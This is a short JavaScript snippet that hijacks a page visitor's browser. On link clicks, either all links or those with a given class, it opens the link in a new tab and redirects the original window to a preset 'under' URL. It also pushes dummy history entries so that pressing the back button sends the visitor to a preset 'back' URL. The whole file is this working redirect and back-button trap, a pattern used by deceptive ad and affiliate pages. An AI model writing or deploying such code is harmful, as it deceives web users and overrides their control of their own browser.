if (typeof under !== "undefined" && under !== null) {
  if (typeof cta !== "undefined" && cta !== null) {
    document.addEventListener('click', function(event) {
      var target = event.target;
      while (target) {
        if (target.tagName === 'A' && target.classList.contains(cta)) {
          const linkHref = target.href;
          event.preventDefault();
          window.open(linkHref, '_blank');
          top.window.location.href = under; // Simulate redirect by setting the href property
          break;
        }
        target = target.parentNode;
      }
    });
  } else {
    document.addEventListener('click', function(event) {
      var target = event.target;
      while (target) {
        if (target.tagName === 'A') {
          const linkHref = target.href;
          event.preventDefault();
          window.open(linkHref, '_blank');
          top.window.location.href = under; // Simulate redirect by setting the href property
          break;
        }
        target = target.parentNode;
      }
    });
  }
}

if (typeof back !== "undefined" && back !== null) {
  !(function() {
    var t;
    try {
      const URL = top.window.location.href.split(/[#]/)[0]; // Uses top-level window location
      for (t = 0; t < 10; ++t) history.pushState({}, '', URL + '#');
      onpopstate = function(event) {
        event.state && (top.window.location.href = back); // Simulate redirect by setting the href property
      };
    } catch (o) {
      console.log(o);
    }
  })();
}
